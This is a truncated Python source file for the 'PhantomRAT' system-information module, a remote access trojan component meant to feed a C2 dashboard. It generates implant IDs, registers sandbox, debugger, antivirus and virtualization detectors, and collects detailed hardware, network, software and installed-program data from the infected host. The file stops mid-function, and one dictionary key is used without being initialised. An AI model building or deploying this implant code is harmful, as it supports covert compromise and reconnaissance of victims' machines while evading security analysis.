#!/usr/bin/env python3
"""
PhantomRAT Enhanced System Information Module v4.0
Comprehensive system profiling with advanced detection, forensics, and risk assessment.
Enhanced for C2 v4.0 dashboard integration and security analysis.
"""

import platform
import os
import sys
import psutil
import socket
import uuid
import json
import hashlib
import datetime
import time
import subprocess
import re
import logging
import locale
import getpass
import threading
import base64
import math
from typing import Dict, List, Any, Optional, Tuple
from pathlib import Path
from dataclasses import dataclass, asdict
from enum import Enum
from collections import defaultdict
import concurrent.futures

# Configure logging
logging.basicConfig(level=logging.WARNING)
logger = logging.getLogger(__name__)

# ==================== ENUMS AND DATA CLASSES ====================
class RiskLevel(Enum):
    """Risk assessment levels"""
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    SAFE = "SAFE"

class SecurityStatus(Enum):
    """Security status levels"""
    COMPROMISED = "COMPROMISED"
    SUSPICIOUS = "SUSPICIOUS"
    CLEAN = "CLEAN"
    UNKNOWN = "UNKNOWN"

@dataclass
class SystemProfile:
    """System profile data class"""
    hostname: str
    os: str
    architecture: str
    cpu_cores: int
    memory_gb: float
    username: str
    is_admin: bool
    risk_level: str
    risk_score: int
    timestamp: str
    implant_id: Optional[str] = None

@dataclass
class SecurityFinding:
    """Security finding data class"""
    severity: str
    category: str
    description: str
    evidence: List[str]
    remediation: Optional[str] = None
    timestamp: str = None

# ==================== SYSTEM INFO COLLECTOR ====================
class EnhancedSystemInfo:
    """
    Enhanced system information collection with detailed profiling,
    security analysis, and forensic artifact collection.
    """
    
    def __init__(self, implant_id: Optional[str] = None):
        self.system_data = {}
        self.collection_time = None
        self.cache_duration = 300  # Cache for 5 minutes
        self.cache = {}
        self.cache_timestamp = {}
        self.implant_id = implant_id or self._generate_implant_id()
        self.security_findings = []
        self.performance_data = {}
        self._setup_detectors()
        
    def _setup_detectors(self):
        """Setup various detection modules"""
        self.detectors = {
            'antivirus': self._detect_antivirus,
            'firewall': self._detect_firewall,
            'sandbox': self._detect_sandbox,
            'debugger': self._detect_debugger,
            'monitoring': self._detect_monitoring_tools,
            'virtualization': self._detect_virtualization,
            'persistence': self._detect_persistence,
            'network_monitoring': self._detect_network_monitoring
        }
    
    def _generate_implant_id(self) -> str:
        """Generate unique implant ID"""
        host_hash = hashlib.sha256(socket.gethostname().encode()).hexdigest()[:12]
        return f"PHANTOM-{host_hash.upper()}"
    
    def get_comprehensive_info(self, include_forensics: bool = True) -> Dict[str, Any]:
        """
        Get comprehensive system information with optional forensic data
        
        Args:
            include_forensics: Include forensic artifact collection (can be slow)
        
        Returns:
            Dictionary containing all system information
        """
        start_time = time.time()
        self.collection_time = datetime.datetime.now()
        
        logger.info(f"[*] Starting comprehensive system information collection")
        
        # Collect basic information first
        self.system_data = {
            'metadata': {
                'collection_id': str(uuid.uuid4()),
                'timestamp': self.collection_time.isoformat(),
                'implant_id': self.implant_id,
                'collection_duration': 0,
                'phases_completed': []
            },
            'basic_info': self._get_basic_info(),
            'hardware_info': self._get_hardware_info(),
            'software_info': self._get_software_info(),
            'network_info': self._get_network_info(),
            'security_info': self._get_security_info(),
            'user_info': self._get_user_info(),
            'process_info': self._get_process_info(),
            'performance_info': self._get_performance_info(),
            'environment_info': self._get_environment_info()
        }
        
        # Parallel collection for performance
        with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
            futures = {
                executor.submit(self._get_antivirus_info): 'antivirus_info',
                executor.submit(self._get_forensic_artifacts): 'forensic_artifacts',
                executor.submit(self._calculate_risk_assessment): 'risk_assessment',
                executor.submit(self._run_security_scan): 'security_scan'
            }
            
            for future in concurrent.futures.as_completed(futures):
                key = futures[future]
                try:
                    self.system_data[key] = future.result()
                    self.system_data['metadata']['phases_completed'].append(key)
                except Exception as e:
                    logger.error(f"[!] Error collecting {key}: {e}")
                    self.system_data[key] = {'error': str(e)}
        
        # Calculate hash for data integrity
        data_str = json.dumps(self.system_data, sort_keys=True, default=str)
        self.system_data['integrity'] = {
            'hash': hashlib.sha256(data_str.encode()).hexdigest(),
            'algorithm': 'SHA-256',
            'size_bytes': len(data_str.encode())
        }
        
        # Update metadata
        self.system_data['metadata']['collection_duration'] = time.time() - start_time
        self.system_data['metadata']['collection_status'] = 'COMPLETED'
        
        logger.info(f"[+] System information collection completed in {self.system_data['metadata']['collection_duration']:.2f}s")
        
        return self.system_data
    
    def _get_basic_info(self) -> Dict[str, Any]:
        """Get basic system information"""
        logger.debug("[*] Collecting basic system information")
        
        info = {
            'hostname': socket.gethostname(),
            'fqdn': socket.getfqdn(),
            'operating_system': platform.system(),
            'os_release': platform.release(),
            'os_version': platform.version(),
            'architecture': platform.machine(),
            'processor': platform.processor(),
            'boot_time': datetime.datetime.fromtimestamp(psutil.boot_time()).isoformat(),
            'uptime': {
                'seconds': time.time() - psutil.boot_time(),
                'formatted': self._format_uptime(time.time() - psutil.boot_time())
            },
            'timezone': {
                'current': time.tzname,
                'offset': time.timezone,
                'dst_offset': time.altzone if time.daylight else None
            },
            'locale': {
                'default': locale.getdefaultlocale(),
                'preferred': locale.getlocale() if hasattr(locale, 'getlocale') else 'unknown'
            },
            'system_manufacturer': self._get_system_manufacturer(),
            'system_model': self._get_system_model(),
            'bios_info': self._get_bios_info()
        }
        
        # Add platform-specific info
        if platform.system() == 'Windows':
            info['windows_edition'] = self._get_windows_edition()
            info['install_date'] = self._get_windows_install_date()
        
        return info
    
    def _format_uptime(self, seconds: float) -> str:
        """Format uptime to human readable string"""
        days = int(seconds // 86400)
        hours = int((seconds % 86400) // 3600)
        minutes = int((seconds % 3600) // 60)
        
        parts = []
        if days > 0:
            parts.append(f"{days}d")
        if hours > 0:
            parts.append(f"{hours}h")
        if minutes > 0:
            parts.append(f"{minutes}m")
        
        return ' '.join(parts) if parts else f"{int(seconds)}s"
    
    def _get_system_manufacturer(self) -> Optional[str]:
        """Get system manufacturer"""
        try:
            if platform.system() == 'Windows':
                import winreg
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\BIOS")
                manufacturer, _ = winreg.QueryValueEx(key, "SystemManufacturer")
                winreg.CloseKey(key)
                return manufacturer
            elif platform.system() == 'Linux':
                with open('/sys/class/dmi/id/sys_vendor', 'r') as f:
                    return f.read().strip()
        except:
            return None
    
    def _get_system_model(self) -> Optional[str]:
        """Get system model"""
        try:
            if platform.system() == 'Windows':
                import winreg
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\BIOS")
                model, _ = winreg.QueryValueEx(key, "SystemProductName")
                winreg.CloseKey(key)
                return model
            elif platform.system() == 'Linux':
                with open('/sys/class/dmi/id/product_name', 'r') as f:
                    return f.read().strip()
        except:
            return None
    
    def _get_bios_info(self) -> Dict[str, Any]:
        """Get BIOS information"""
        bios_info = {}
        
        try:
            if platform.system() == 'Windows':
                import winreg
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\BIOS")
                
                for value_name in ['BIOSVersion', 'BIOSReleaseDate', 'BIOSVendor']:
                    try:
                        value, _ = winreg.QueryValueEx(key, value_name)
                        bios_info[value_name.lower()] = value
                    except:
                        pass
                
                winreg.CloseKey(key)
            
            elif platform.system() == 'Linux':
                dmi_files = {
                    'bios_version': '/sys/class/dmi/id/bios_version',
                    'bios_date': '/sys/class/dmi/id/bios_date',
                    'bios_vendor': '/sys/class/dmi/id/bios_vendor'
                }
                
                for key, path in dmi_files.items():
                    try:
                        with open(path, 'r') as f:
                            bios_info[key] = f.read().strip()
                    except:
                        pass
        
        except:
            pass
        
        return bios_info
    
    def _get_windows_edition(self) -> Optional[str]:
        """Get Windows edition"""
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
            edition, _ = winreg.QueryValueEx(key, "ProductName")
            winreg.CloseKey(key)
            return edition
        except:
            return None
    
    def _get_windows_install_date(self) -> Optional[str]:
        """Get Windows installation date"""
        try:
            import winreg
            import datetime
            
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
            install_timestamp, _ = winreg.QueryValueEx(key, "InstallDate")
            winreg.CloseKey(key)
            
            if install_timestamp:
                return datetime.datetime.fromtimestamp(install_timestamp).isoformat()
        except:
            return None
    
    def _get_hardware_info(self) -> Dict[str, Any]:
        """Get detailed hardware information"""
        logger.debug("[*] Collecting hardware information")
        
        info = {
            'cpu': self._get_cpu_info(),
            'memory': self._get_memory_info(),
            'disks': self._get_disk_info(),
            'network_interfaces': self._get_interface_info(),
            'battery': self._get_battery_info() if hasattr(psutil, 'sensors_battery') else None,
            'sensors': self._get_sensor_info(),
            'usb_devices': self._get_usb_info(),
            'pci_devices': self._get_pci_devices(),
            'motherboard': self._get_motherboard_info(),
            'ram_modules': self._get_ram_info()
        }
        
        # GPU information (if available)
        try:
            info['gpu'] = self._get_gpu_info()
        except Exception as e:
            logger.debug(f"[!] GPU info error: {e}")
            info['gpu'] = None
        
        return info
    
    def _get_cpu_info(self) -> Dict[str, Any]:
        """Get CPU information"""
        try:
            cpu_percent = psutil.cpu_percent(interval=0.5, percpu=True)
            cpu_freq = psutil.cpu_freq()
            cpu_stats = psutil.cpu_stats()
            cpu_times = psutil.cpu_times_percent(interval=0.5)
            
            cpu_info = {
                'physical_cores': psutil.cpu_count(logical=False),
                'logical_cores': psutil.cpu_count(logical=True),
                'cpu_percent': cpu_percent,
                'cpu_percent_total': sum(cpu_percent) / len(cpu_percent) if cpu_percent else 0,
                'cpu_freq': cpu_freq._asdict() if cpu_freq else None,
                'cpu_stats': cpu_stats._asdict(),
                'cpu_times': cpu_times._asdict(),
                'architecture_details': platform.processor()
            }
            
            # Try to get CPU brand/model
            try:
                if platform.system() == 'Windows':
                    import winreg
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\CentralProcessor\0")
                    processor_name, _ = winreg.QueryValueEx(key, "ProcessorNameString")
                    winreg.CloseKey(key)
                    cpu_info['brand'] = processor_name.strip()
                elif platform.system() == 'Linux':
                    with open('/proc/cpuinfo', 'r') as f:
                        for line in f:
                            if line.startswith('model name'):
                                cpu_info['brand'] = line.split(':', 1)[1].strip()
                                break
            except:
                pass
            
            # CPU flags/capabilities
            try:
                if platform.system() == 'Linux':
                    with open('/proc/cpuinfo', 'r') as f:
                        content = f.read()
                        if 'flags' in content:
                            for line in content.split('\n'):
                                if line.startswith('flags'):
                                    cpu_info['flags'] = line.split(':', 1)[1].strip().split()
                                    break
            except:
                pass
            
            return cpu_info
            
        except Exception as e:
            logger.error(f"[!] CPU info error: {e}")
            return {'error': str(e)}
    
    def _get_memory_info(self) -> Dict[str, Any]:
        """Get memory information"""
        try:
            virtual = psutil.virtual_memory()
            swap = psutil.swap_memory()
            
            memory_info = {
                'virtual': {
                    'total': virtual.total,
                    'available': virtual.available,
                    'percent': virtual.percent,
                    'used': virtual.used,
                    'free': virtual.free,
                    'active': getattr(virtual, 'active', None),
                    'inactive': getattr(virtual, 'inactive', None),
                    'buffers': getattr(virtual, 'buffers', None),
                    'cached': getattr(virtual, 'cached', None),
                    'shared': getattr(virtual, 'shared', None),
                    'slab': getattr(virtual, 'slab', None)
                },
                'swap': {
                    'total': swap.total,
                    'used': swap.used,
                    'free': swap.free,
                    'percent': swap.percent,
                    'sin': swap.sin,
                    'sout': swap.sout
                }
            }
            
            # Get memory details for Linux
            if platform.system() == 'Linux':
                try:
                    with open('/proc/meminfo', 'r') as f:
                        for line in f:
                            if ':' in line:
                                key, value = line.split(':', 1)
                                memory_info['detailed'][key.strip()] = value.strip()
                except:
                    pass
            
            return memory_info
            
        except Exception as e:
            logger.error(f"[!] Memory info error: {e}")
            return {'error': str(e)}
    
    def _get_disk_info(self) -> List[Dict[str, Any]]:
        """Get disk information"""
        disks = []
        
        try:
            for partition in psutil.disk_partitions(all=False):
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    
                    disk_info = {
                        'device': partition.device,
                        'mountpoint': partition.mountpoint,
                        'fstype': partition.fstype,
                        'opts': partition.opts,
                        'total': usage.total,
                        'used': usage.used,
                        'free': usage.free,
                        'percent': usage.percent,
                        'read_only': 'ro' in partition.opts
                    }
                    
                    # Get disk serial/model for physical disks
                    if platform.system() == 'Windows':
                        try:
                            import win32api
                            drive = partition.device[0]
                            volume_info = win32api.GetVolumeInformation(f"{drive}:\\")
                            disk_info['label'] = volume_info[0]
                            disk_info['serial'] = volume_info[1]
                        except:
                            pass
                    
                    # Get disk I/O statistics
                    try:
                        disk_io = psutil.disk_io_counters(perdisk=True)
                        if partition.device in disk_io:
                            disk_info['io_stats'] = disk_io[partition.device]._asdict()
                    except:
                        pass
                    
                    # SMART data (if available)
                    if self._has_smart_support(partition.device):
                        disk_info['smart'] = self._get_smart_data(partition.device)
                    
                    disks.append(disk_info)
                    
                except Exception as e:
                    logger.debug(f"[!] Disk info error for {partition.device}: {e}")
                    continue
            
            # Sort by mountpoint
            disks.sort(key=lambda x: x['mountpoint'])
            
        except Exception as e:
            logger.error(f"[!] Disk collection error: {e}")
        
        return disks
    
    def _has_smart_support(self, device: str) -> bool:
        """Check if disk has SMART support"""
        try:
            if platform.system() == 'Linux':
                device_name = device.split('/')[-1]
                smartctl_path = '/usr/sbin/smartctl'
                if os.path.exists(smartctl_path):
                    result = subprocess.run(
                        [smartctl_path, '-i', device],
                        capture_output=True, text=True
                    )
                    return 'SMART support is: Available' in result.stdout
        except:
            pass
        return False
    
    def _get_smart_data(self, device: str) -> Dict[str, Any]:
        """Get SMART data for disk"""
        try:
            if platform.system() == 'Linux':
                smartctl_path = '/usr/sbin/smartctl'
                if os.path.exists(smartctl_path):
                    result = subprocess.run(
                        [smartctl_path, '-A', device],
                        capture_output=True, text=True
                    )
                    
                    if result.returncode == 0:
                        smart_data = {}
                        lines = result.stdout.split('\n')
                        
                        for line in lines:
                            if line.strip() and not line.startswith('ID#'):
                                parts = line.split()
                                if len(parts) >= 10:
                                    smart_data[parts[1]] = {
                                        'id': parts[0],
                                        'name': ' '.join(parts[1:-8]),
                                        'value': parts[-8],
                                        'worst': parts[-7],
                                        'threshold': parts[-6],
                                        'raw_value': ' '.join(parts[-5:])
                                    }
                        
                        return smart_data
        except:
            pass
        return {}
    
    def _get_interface_info(self) -> List[Dict[str, Any]]:
        """Get network interface information"""
        interfaces = []
        
        try:
            for name, addrs in psutil.net_if_addrs().items():
                interface_info = {
                    'name': name,
                    'mac_address': None,
                    'ipv4_addresses': [],
                    'ipv6_addresses': [],
                    'stats': None,
                    'io_counters': None,
                    'is_up': False,
                    'speed_mbps': None,
                    'mtu': None
                }
                
                for addr in addrs:
                    addr_info = {
                        'address': addr.address,
                        'netmask': addr.netmask,
                        'broadcast': addr.broadcast,
                        'ptp': addr.ptp
                    }
                    
                    if addr.family == socket.AF_INET:
                        interface_info['ipv4_addresses'].append(addr_info)
                    elif addr.family == socket.AF_INET6:
                        interface_info['ipv6_addresses'].append(addr_info)
                    elif addr.family == psutil.AF_LINK:
                        interface_info['mac_address'] = addr.address
                
                # Get interface statistics
                try:
                    stats = psutil.net_if_stats()
                    if name in stats:
                        interface_info['stats'] = {
                            'isup': stats[name].isup,
                            'duplex': str(stats[name].duplex),
                            'speed': stats[name].speed,
                            'mtu': stats[name].mtu
                        }
                        interface_info['is_up'] = stats[name].isup
                        interface_info['speed_mbps'] = stats[name].speed
                        interface_info['mtu'] = stats[name].mtu
                except:
                    pass
                
                # Get I/O counters
                try:
                    io_counters = psutil.net_io_counters(pernic=True)
                    if name in io_counters:
                        interface_info['io_counters'] = io_counters[name]._asdict()
                except:
                    pass
                
                interfaces.append(interface_info)
            
            # Sort by interface name
            interfaces.sort(key=lambda x: x['name'])
            
        except Exception as e:
            logger.error(f"[!] Interface info error: {e}")
        
        return interfaces
    
    def _get_battery_info(self) -> Optional[Dict[str, Any]]:
        """Get battery information"""
        try:
            battery = psutil.sensors_battery()
            if battery:
                return {
                    'percent': battery.percent,
                    'secsleft': battery.secsleft,
                    'power_plugged': battery.power_plugged,
                    'status': 'Charging' if battery.power_plugged else 'Discharging'
                }
        except Exception as e:
            logger.debug(f"[!] Battery info error: {e}")
        return None
    
    def _get_sensor_info(self) -> Dict[str, Any]:
        """Get sensor information"""
        sensors = {}
        
        # Temperature sensors
        try:
            if hasattr(psutil, 'sensors_temperatures'):
                temps = psutil.sensors_temperatures()
                if temps:
                    sensors['temperatures'] = temps
        except:
            pass
        
        # Fan speeds
        try:
            if hasattr(psutil, 'sensors_fans'):
                fans = psutil.sensors_fans()
                if fans:
                    sensors['fans'] = fans
        except:
            pass
        
        # Battery (already handled separately)
        
        return sensors
    
    def _get_usb_info(self) -> List[Dict[str, Any]]:
        """Get USB device information"""
        usb_devices = []
        
        try:
            if platform.system() == 'Windows':
                # Windows USB device detection via WMI
                try:
                    import wmi
                    c = wmi.WMI()
                    
                    for usb in c.Win32_USBControllerDevice():
                        try:
                            device = usb.Dependent
                            usb_devices.append({
                                'device_id': device.DeviceID,
                                'description': device.Description,
                                'manufacturer': device.Manufacturer,
                                'name': device.Name,
                                'status': device.Status,
                                'service': device.Service
                            })
                        except:
                            continue
                except:
                    pass
                
                # Alternative registry method
                try:
                    import winreg
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Enum\USB")
                    
                    for i in range(0, winreg.QueryInfoKey(key)[0]):
                        try:
                            vendor_id = winreg.EnumKey(key, i)
                            vendor_key = winreg.OpenKey(key, vendor_id)
                            
                            for j in range(0, winreg.QueryInfoKey(vendor_key)[0]):
                                try:
                                    product_id = winreg.EnumKey(vendor_key, j)
                                    product_key = winreg.OpenKey(vendor_key, product_id)
                                    
                                    device_info = {
                                        'vendor_id': vendor_id,
                                        'product_id': product_id,
                                        'description': self._reg_get_value(product_key, 'DeviceDesc'),
                                        'manufacturer': self._reg_get_value(product_key, 'Mfg'),
                                        'service': self._reg_get_value(product_key, 'Service')
                                    }
                                    
                                    if device_info['description']:
                                        usb_devices.append(device_info)
                                    
                                    winreg.CloseKey(product_key)
                                except:
                                    continue
                            
                            winreg.CloseKey(vendor_key)
                        except:
                            continue
                    
                    winreg.CloseKey(key)
                except:
                    pass
            
            elif platform.system() == 'Linux':
                # Linux USB device detection
                try:
                    import glob
                    for usb in glob.glob('/sys/bus/usb/devices/*'):
                        try:
                            vendor = self._read_file(os.path.join(usb, 'idVendor'))
                            product = self._read_file(os.path.join(usb, 'idProduct'))
                            
                            if vendor and product:
                                device_info = {
                                    'path': usb,
                                    'vendor': vendor,
                                    'product': product,
                                    'vendor_name': self._usb_vendor_name(vendor),
                                    'busnum': self._read_file(os.path.join(usb, 'busnum')),
                                    'devnum': self._read_file(os.path.join(usb, 'devnum')),
                                    'speed': self._read_file(os.path.join(usb, 'speed')),
                                    'manufacturer': self._read_file(os.path.join(usb, 'manufacturer')),
                                    'product_name': self._read_file(os.path.join(usb, 'product'))
                                }
                                usb_devices.append(device_info)
                        except:
                            continue
                except:
                    pass
        
        except Exception as e:
            logger.error(f"[!] USB info error: {e}")
        
        return usb_devices
    
    def _usb_vendor_name(self, vendor_id: str) -> str:
        """Get USB vendor name from ID"""
        # Common USB vendor IDs
        vendor_map = {
            '8086': 'Intel',
            '8087': 'Intel',
            '04e8': 'Samsung',
            '045e': 'Microsoft',
            '046d': 'Logitech',
            '0bda': 'Realtek',
            '0489': 'Foxconn',
            '050d': 'Belkin',
            '0a5c': 'Broadcom',
            '0cf3': 'Atheros',
            '0930': 'Toshiba',
            '04f2': 'Chicony',
            '0c45': 'Microdia',
            '046a': 'Cherry',
            '056a': 'Wacom'
        }
        return vendor_map.get(vendor_id.lower(), 'Unknown')
    
    def _get_pci_devices(self) -> List[Dict[str, Any]]:
        """Get PCI device information"""
        pci_devices = []
        
        try:
            if platform.system() == 'Linux':
                import glob
                for pci in glob.glob('/sys/bus/pci/devices/*'):
                    try:
                        device_info = {
                            'address': os.path.basename(pci),
                            'vendor': self._read_file(os.path.join(pci, 'vendor')),
                            'device': self._read_file(os.path.join(pci, 'device')),
                            'class': self._read_file(os.path.join(pci, 'class')),
                            'driver': self._read_file(os.path.join(pci, 'driver/module')),
                            'irq': self._read_file(os.path.join(pci, 'irq')),
                            'resource': self._read_file(os.path.join(pci, 'resource'))
                        }
                        pci_devices.append(device_info)
                    except:
                        continue
        except:
            pass
        
        return pci_devices
    
    def _get_motherboard_info(self) -> Dict[str, Any]:
        """Get motherboard information"""
        mb_info = {}
        
        try:
            if platform.system() == 'Linux':
                dmi_files = {
                    'board_vendor': '/sys/class/dmi/id/board_vendor',
                    'board_name': '/sys/class/dmi/id/board_name',
                    'board_version': '/sys/class/dmi/id/board_version',
                    'board_serial': '/sys/class/dmi/id/board_serial'
                }
                
                for key, path in dmi_files.items():
                    try:
                        with open(path, 'r') as f:
                            mb_info[key] = f.read().strip()
                    except:
                        pass
        except:
            pass
        
        return mb_info
    
    def _get_ram_info(self) -> List[Dict[str, Any]]:
        """Get RAM module information"""
        ram_modules = []
        
        try:
            if platform.system() == 'Linux':
                import glob
                dimm_count = 0
                
                for dimm in glob.glob('/sys/devices/system/edac/mc/mc*/dimm*'):
                    try:
                        dimm_info = {
                            'dimm': os.path.basename(dimm),
                            'size': self._read_file(os.path.join(dimm, 'size')),
                            'mem_type': self._read_file(os.path.join(dimm, 'dimm_mem_type')),
                            'edac_mode': self._read_file(os.path.join(dimm, 'dimm_edac_mode')),
                            'ce_count': self._read_file(os.path.join(dimm, 'dimm_ce_count')),
                            'ue_count': self._read_file(os.path.join(dimm, 'dimm_ue_count'))
                        }
                        ram_modules.append(dimm_info)
                        dimm_count += 1
                    except:
                        continue
                
                # If no EDAC info, try dmidecode
                if dimm_count == 0:
                    try:
                        result = subprocess.run(
                            ['dmidecode', '-t', 'memory'],
                            capture_output=True, text=True
                        )
                        
                        if result.returncode == 0:
                            current_dimm = {}
                            for line in result.stdout.split('\n'):
                                line = line.strip()
                                if line.startswith('Memory Device'):
                                    if current_dimm:
                                        ram_modules.append(current_dimm)
                                    current_dimm = {}
                                elif ': ' in line:
                                    key, value = line.split(':', 1)
                                    current_dimm[key.strip()] = value.strip()
                            
                            if current_dimm:
                                ram_modules.append(current_dimm)
                    except:
                        pass
        
        except Exception as e:
            logger.debug(f"[!] RAM info error: {e}")
        
        return ram_modules
    
    def _get_gpu_info(self) -> List[Dict[str, Any]]:
        """Get GPU information"""
        gpus = []
        
        try:
            if platform.system() == 'Windows':
                # Try using wmic
                try:
                    result = subprocess.run(
                        ['wmic', 'path', 'win32_videocontroller', 'get', 
                         'name,adapterram,driverversion,adapterdactype,currentrefreshrate',
                         '/format:list'],
                        capture_output=True, text=True, encoding='utf-8', errors='ignore'
                    )
                    
                    current_gpu = {}
                    for line in result.stdout.split('\n'):
                        line = line.strip()
                        if line.startswith('Name='):
                            if current_gpu:
                                gpus.append(current_gpu)
                            current_gpu = {'name': line.split('=', 1)[1]}
                        elif line.startswith('AdapterRAM='):
                            current_gpu['memory'] = line.split('=', 1)[1]
                        elif line.startswith('DriverVersion='):
                            current_gpu['driver_version'] = line.split('=', 1)[1]
                        elif line.startswith('AdapterDACType='):
                            current_gpu['dac_type'] = line.split('=', 1)[1]
                        elif line.startswith('CurrentRefreshRate='):
                            current_gpu['refresh_rate'] = line.split('=', 1)[1]
                    
                    if current_gpu:
                        gpus.append(current_gpu)
                        
                except:
                    pass
                
                # Try using dxdiag
                try:
                    import tempfile
                    import xml.etree.ElementTree as ET
                    
                    with tempfile.NamedTemporaryFile(mode='w+', suffix='.xml', delete=False) as tmp:
                        tmp_path = tmp.name
                    
                    subprocess.run(['dxdiag', '/x', tmp_path], capture_output=True, timeout=10)
                    
                    if os.path.exists(tmp_path):
                        tree = ET.parse(tmp_path)
                        root = tree.getroot()
                        
                        for display_device in root.findall('.//DisplayDevice'):
                            gpu_info = {
                                'name': display_device.findtext('CardName', ''),
                                'manufacturer': display_device.findtext('Manufacturer', ''),
                                'chip_type': display_device.findtext('ChipType', ''),
                                'dac_type': display_device.findtext('DACType', ''),
                                'memory': display_device.findtext('DisplayMemory', ''),
                                'driver_version': display_device.findtext('DriverVersion', '')
                            }
                            if gpu_info['name']:
                                gpus.append(gpu_info)
                        
                        os.unlink(tmp_path)
                        
                except:
                    pass
            
            elif platform.system() == 'Linux':
                # Try lspci
                try:
                    result = subprocess.run(
                        ['lspci', '-nn', '-v'],
                        capture_output=True, text=True
                    )
                    
                    current_gpu = {}
                    in_gpu_section = False
                    
                    for line in result.stdout.split('\n'):
                        if 'VGA compatible controller' in line or '3D controller' in line:
                            if current_gpu:
                                gpus.append(current_gpu)
                            current_gpu = {
                                'description': line.strip(),
                                'driver': None,
                                'memory': None
                            }
                            in_gpu_section = True
                        
                        elif in_gpu_section:
                            if line.strip().startswith('Kernel driver in use:'):
                                current_gpu['driver'] = line.split(':')[1].strip()
                            elif line.strip().startswith('Memory at'):
                                current_gpu['memory'] = line.strip()
                            elif line.strip() == '':
                                if current_gpu:
                                    gpus.append(current_gpu)
                                current_gpu = {}
                                in_gpu_section = False
                    
                    if current_gpu and in_gpu_section:
                        gpus.append(current_gpu)
                        
                except:
                    pass
                
                # Try nvidia-smi if available
                try:
                    result = subprocess.run(
                        ['nvidia-smi', '--query-gpu=name,memory.total,driver_version', 
                         '--format=csv,noheader'],
                        capture_output=True, text=True
                    )
                    
                    if result.returncode == 0:
                        for line in result.stdout.strip().split('\n'):
                            parts = line.split(', ')
                            if len(parts) >= 3:
                                gpus.append({
                                    'name': parts[0],
                                    'memory': parts[1],
                                    'driver_version': parts[2],
                                    'vendor': 'NVIDIA'
                                })
                except:
                    pass
                
                # Try glxinfo for OpenGL info
                try:
                    result = subprocess.run(
                        ['glxinfo', '-B'],
                        capture_output=True, text=True
                    )
                    
                    if result.returncode == 0:
                        for line in result.stdout.split('\n'):
                            if 'Device:' in line:
                                gpu_name = line.split(':', 1)[1].strip()
                                for gpu in gpus:
                                    if gpu_name in gpu.get('name', ''):
                                        gpu['opengl'] = gpu_name
                                        break
                except:
                    pass
        
        except Exception as e:
            logger.error(f"[!] GPU info error: {e}")
        
        return gpus
    
    def _reg_get_value(self, key, value_name):
        """Helper to get registry value"""
        try:
            import winreg
            value, _ = winreg.QueryValueEx(key, value_name)
            return value
        except:
            return None
    
    def _read_file(self, path: str) -> Optional[str]:
        """Helper to read file safely"""
        try:
            with open(path, 'r') as f:
                return f.read().strip()
        except:
            return None
    
    def _get_software_info(self) -> Dict[str, Any]:
        """Get software information"""
        logger.debug("[*] Collecting software information")
        
        return {
            'python_environment': self._get_python_info(),
            'installed_packages': self._get_installed_packages(),
            'running_services': self._get_running_services(),
            'scheduled_tasks': self._get_scheduled_tasks(),
            'startup_programs': self._get_startup_programs(),
            'browsers': self._get_browser_info(),
            'development_tools': self._get_development_tools(),
            'security_software': self._get_security_software()
        }
    
    def _get_python_info(self) -> Dict[str, Any]:
        """Get Python environment information"""
        return {
            'version': {
                'full': platform.python_version(),
                'major': sys.version_info.major,
                'minor': sys.version_info.minor,
                'micro': sys.version_info.micro
            },
            'implementation': platform.python_implementation(),
            'compiler': platform.python_compiler(),
            'build': platform.python_build(),
            'executable': sys.executable,
            'prefix': sys.prefix,
            'base_prefix': getattr(sys, 'base_prefix', sys.prefix),
            'path': sys.path,
            'platform': sys.platform,
            'byteorder': sys.byteorder,
            'modules_loaded': len(sys.modules),
            'threading': {
                'active_count': threading.active_count(),
                'current_thread': threading.current_thread().name,
                'main_thread': threading.main_thread().name
            }
        }
    
    def _get_installed_packages(self) -> Dict[str, List[Dict[str, str]]]:
        """Get installed packages categorized by type"""
        packages = {
            'python': [],
            'system': [],
            'development': [],
            'security': [],
            'virtualization': []
        }
        
        # Python packages
        try:
            import pkg_resources
            for dist in pkg_resources.working_set:
                packages['python'].append({
                    'name': dist.key,
                    'version': dist.version,
                    'location': dist.location,
                    'requires': [str(req) for req in dist.requires()],
                    'project_name': dist.project_name
                })
        except:
            pass
        
        # System packages (platform specific)
        if platform.system() == 'Windows':
            packages['system'] = self._get_windows_installed_programs()
        elif platform.system() == 'Linux':
            packages['system'] = self._get_linux_installed_packages()
        elif platform.system() == 'Darwin':
            packages['system'] = self._get_macos_installed_packages()
        
        return packages
    
    def _get_windows_installed_programs(self) -> List[Dict[str, str]]:
        """Get Windows installed programs"""
        programs = []
        
        try:
            import winreg
            
            # 64-bit registry
            reg_paths = [
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
            ]
            
            for root, base_path in reg_paths:
                try:
                    key = winreg.OpenKey(root, base_path)
                    
                    for i in range(0, winreg.QueryInfoKey(key)[0]):
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            subkey = winreg.OpenKey(key, subkey_name)
                            
                            program_info = {}
                            
                            # Try to get display name
                            try:
                                display_name = winreg.QueryValueEx(subkey, 'DisplayName')[0]
                                if not display_name:
                                    continue
                                program_info['name'] = display_name
                            except:
                                continue
                            
                            # Get other info
                            try:
                                program_info['version'] = winreg.QueryValueEx(subkey, 'DisplayVersion')[0]
                            except:
                                pass
                            
                            try:
                                program_info['publisher'] = winreg.QueryValueEx(subkey, 'Publisher')[0]
                            except:
                                pass
                            
                            try:
